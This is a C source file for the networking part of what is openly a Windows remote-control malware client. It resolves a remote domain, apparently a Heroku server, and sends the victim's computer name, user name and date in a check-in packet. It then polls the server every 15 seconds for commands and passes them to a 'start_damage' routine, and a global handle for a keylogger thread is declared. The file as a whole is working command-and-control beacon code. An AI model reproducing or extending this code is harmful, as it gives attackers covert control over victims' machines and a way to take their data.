#include "Socket.h"


// extern variables: -> needed if running with server in herkou
char SOCKET_IP[16] = { 0 };
int SOCKET_PORT = 0;
char pc_name[MAX_COMPUTERNAME_LENGTH + 1] = { 0 }; // global variable of the pc-name -> used in many functions.
HANDLE thread_handle = 0; // thread handle for the Key Logger -> declared here to be able to close the thread when needed.


// main socket function conversation.
int start_socket()
{
    WSADATA wsaData = { 0 };
    struct sockaddr_in clientService = { 0 };
    SOCKET ConnectSocket = { 0 };
    char* data = NULL;
    int iResult = 0;


    // start the socket connection
    if (connect_socket(wsaData, clientService, &ConnectSocket) != 0)
    {
        printf("Problem starting the connection with the socket \n");
        return -1;
    }

    printf("Connected to server.\n"); // connected to the server -> with socket



    // sends first connection packet to the server
    if (send_first_commit_packet(&ConnectSocket) != 0)
    {
        printf("Problem sending first connection packet! \n");
        return -1;
    }

    // closing the socket connection
    if (close_socket(&ConnectSocket) != 0)
    {
        printf("Problem closing the socket connection! \n");
        return -1;
    }
    printf("socket closed correctly! \n");


    printf("\n---------------------------------\n");




    while (1)
    {
        // start the socket connection
        iResult = connect_socket(wsaData, clientService, &ConnectSocket);
        if (iResult != 0)
        {
            printf("Problem starting the connection with the socket");
            return -1;
        }

        printf("Connected to server.\n"); // connected to the server -> with socket


        // every few minutes send the five minutes function to get commands.
        iResult = get_command(&ConnectSocket, &data);
        if (iResult != 0)
        {
            printf("Problem sending get command packet! \n");
            return -1;
        }

        // closing the socket connection
        iResult = close_socket(&ConnectSocket);
        if (iResult != 0)
        {
            printf("Problem closing the socket connection! \n");
            return -1;
        }

        printf("socket closed correctly! \n");



        //if there are commands to do
        if (data != NULL)
        {
            printf("Commands to do! \n");

            // start using the damage functions. LOL
            iResult = start_damage(data);
            if (iResult != 0)
            {
                printf("Problem in the start damage function! \n");
                return -1;
            }

        }
        else
        {
            printf("No commands to do. \n");
        }
        free(data); // free the memory given
        data = NULL;

        printf("Slepping ZZZZZ \n");

        //Sleep(ONE_MIN_IN_MILISEC); // sleep for 1 minute
        //Sleep(ONE_MIN_IN_MILISEC / 2); // temp Sleep. -> 30 seconds
        Sleep(ONE_MIN_IN_MILISEC / 4); // temp Sleep. -> 15 seconds


    }






    return 0;
}



// Function to start the socket connection.
int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* ConnectSocket)
{
    int iResult = 0;
    /* Varibles for the getaddrinfo function */
    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;

    struct sockaddr_in* sockaddr_ipv4;
    LPSOCKADDR sockaddr_ip;

    char ipstringbuffer[46];
    DWORD ipbufferlength = 46;


    /*

        To connect locally
    */

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        printf("WSAStartup function failed with error: %d\n", iResult);
        return -1;
    }


    *ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*ConnectSocket == INVALID_SOCKET) {
        printf("socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }



    /*
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(SOCKET_IP);
    clientService.sin_port = htons(SOCKET_PORT);
    iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        printf("connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(*ConnectSocket);
        if (iResult == SOCKET_ERROR)
            printf("closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }*/


    /*
        To connect to some heroku server
    */


    ////////////////////////

    //--------------------------------
    // Setup the hints address info structure
    // which is passed to the getaddrinfo() function
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;


    //--------------------------------
    // Call getaddrinfo(). If the call succeeds,
    // the result variable will hold a linked list
    // of addrinfo structures containing response
    // information
    iResult = getaddrinfo(DOMAIN_NAME, HTTP_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    printf("getaddrinfo returned success\n");

    // Retrieve each address and print out the hex bytes
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        switch (ptr->ai_family)
        {
        case AF_INET:
            printf("AF_INET (IPv4)\n");
            sockaddr_ipv4 = (struct sockaddr_in*) ptr->ai_addr;
            printf("\tIPv4 address %s\n", inet_ntoa(sockaddr_ipv4->sin_addr));

            strncpy(ipstringbuffer, inet_ntoa(sockaddr_ipv4->sin_addr), strlen(inet_ntoa(sockaddr_ipv4->sin_addr)));

            // adding null byte in the end.
            ipstringbuffer[strlen(inet_ntoa(sockaddr_ipv4->sin_addr))] = '\0';

            printf("%s:%d \n", ipstringbuffer, sockaddr_ipv4->sin_port);
            // if founded a good ip - try to connect.
            clientService.sin_family = AF_INET;
            clientService.sin_addr.s_addr = inet_addr(ipstringbuffer); // the ip
            clientService.sin_port = (sockaddr_ipv4->sin_port); // the port

            // initializing the global variables for the ip and port connection to send and recv the masseges.
            strncpy(SOCKET_IP, ipstringbuffer, sizeof(SOCKET_IP));
            SOCKET_PORT = sockaddr_ipv4->sin_port;

            printf("%s:%d \n", (ipstringbuffer), (sockaddr_ipv4->sin_port));

            iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
            if (iResult == SOCKET_ERROR) {
                printf("Current ip and port are invalid! \n");
            }
            else
            {
                // if founded good ip and port, and connected successfully - finish the loop.
                printf("Founded ip and port to connect! \n");
                ptr = NULL;
            }

            break;

        default:
            break;
        }

        // if connection has made - stop looking for other connections.
        if (ptr == NULL)
            break;

    }

    freeaddrinfo(result);
    if (iResult == SOCKET_ERROR) {
        printf("connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(*ConnectSocket);
        if (iResult == SOCKET_ERROR)
            printf("closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    ///////////////////

    return 0;
}


// This function closes the connection socket
int close_socket(SOCKET* ConnectSocket)
{
    int iResult = 0;

    // close the socket -> the connection
    iResult = closesocket(*ConnectSocket);
    if (iResult == SOCKET_ERROR) {
        printf("closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    WSACleanup();
    return 0;
}


int send_first_commit_packet(SOCKET* s)
{
    int iResult = 0, buffer_size = MAX_COMPUTERNAME_LENGTH + 1, content_added_size = 0, temp_buffer_size = 0, msg_size = 0;
    PDWORD os_product_type = 0;
    char user_name[MAX_COMPUTERNAME_LENGTH + 1];
    SYSTEMTIME st;
    char* msg = NULL;
    char* content_added = NULL;
    char* temp_buffer = NULL;
    char* server_response = (char*)malloc(SIZE_OF_HTTP_MSG);
    //char* data = (char*) malloc(SIZE_OF_DATA);
    char* data = NULL;
    int msg_response_len = 0;


    // getting the pc name -> global variable of the pc-name
    iResult = GetComputerNameA(pc_name, &buffer_size);


    // getting the user name
    iResult = GetUserName(user_name, &buffer_size);

    // getting the struct as the current time
    GetSystemTime(&st);

    temp_buffer_size = strlen("{%cpc_name%c: %c%s%c,%cuser_name%c: %c%s%c,%cday_of_month%c: %c%d%c}") + strlen(pc_name) + strlen(user_name) + sizeof(int) + 20;

    temp_buffer = (char*)malloc(temp_buffer_size);

    // content added
    content_added_size = snprintf(temp_buffer, temp_buffer_size, "{%cpc_name%c:%c%s%c,%cuser_name%c:%c%s%c,%cday_of_month%c:%c%d%c}", APOSTROPHES, APOSTROPHES, APOSTROPHES, pc_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, user_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, st.wDay, APOSTROPHES);

    // the real size of the content added
    content_added_size = strlen(temp_buffer);

    content_added = (char*)malloc(content_added_size + 1);

    snprintf(content_added, content_added_size + 1, temp_buffer); // '+ 1' to include the last letter -> need one more space for the null byte '\0'

    msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s") + strlen(FIRST_CONNECTION_MSG) + strlen(DOMAIN_NAME) + strlen(content_added) + 20;

    // making the full http packet to send to the server
    msg = (char*)malloc(msg_size);


    // making the full POST message
    snprintf(msg, msg_size, "%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, DOMAIN_NAME, content_added);



    // sending the first connection message
    iResult = send(
        *s,
        msg,
        strlen(msg),
        NULL
    );

    if (iResult == SOCKET_ERROR || iResult == 0)
    {
        printf("Problem sending the first connection message! \n");
        return -1;
    }

    printf("Sent first connection http packet! \n");

    // receiving the full message from the server
    iResult = recv(*s, server_response, SIZE_OF_HTTP_MSG, NULL);
    if (iResult > 0)
    {
        server_response[iResult] = '\0'; // adding the null byte
        msg_response_len = iResult;
    }
    else if (iResult == SOCKET_ERROR || iResult == 0) // if error occurred
    {
        printf("Problem in recv msg from the first connection! ");
        return -1;
    }

    printf("Received the server's response! \n");

    // parsing the http message to get the data given from the server
    data = get_data_from_http_msg(server_response, iResult);



    // checking everything is ok -> the server got the first connection message / packet.
    if (strncmp(data, "true", sizeof("true")) != 0)
    {
        printf("Confirm message from server is not correct! \n");
        return -1;
    }


    free(msg);
    free(content_added);
    free(temp_buffer);
    free(server_response);
    free(data);


    return 0;
}



int get_command(SOCKET* s, char** return_data)
{
    int iResult = 0, msg_len = 0;
    char* msg = NULL;
    char* data = NULL;
    char buf[SIZE_OF_HTTP_MSG];


    msg_len = strlen(GET_COMMAND_MSG) + (MAX_COMPUTERNAME_LENGTH + 1) + strlen(DOMAIN_NAME);

    msg = (char*)malloc(msg_len);

    msg_len = snprintf(msg, msg_len, GET_COMMAND_MSG, pc_name, DOMAIN_NAME); // fixed / real len of the full message


    // sending the get command message
    iResult = send(
        *s,
        msg,
        strlen(msg),
        NULL
    );


    if (iResult == SOCKET_ERROR || iResult == 0)
    {
        printf("Problem sending the get command message! \n");
        return -1;
    }

    printf("Sent the Get Command http packet! \n");


    // receiving the headers from the server
    iResult = recv(*s, buf, SIZE_OF_HTTP_MSG, NULL);
    if (iResult > 0)
    {
        buf[iResult] = '\0'; // adding the null byte
    }
    else
    {
        printf("Error getting the server respose in get command function! \n");
        return -1;
    }

    printf("Received the server's response! \n");

    // parsing the http message to get the data given from the server
    data = get_data_from_http_msg(buf, iResult);

    // if there are commands to do
    if (strncmp(data, "false", strlen("false")) != 0)
    {
        // 'Returning' the data / commands to do
        *return_data = data;
    }


    free(msg);

    return 0;
}
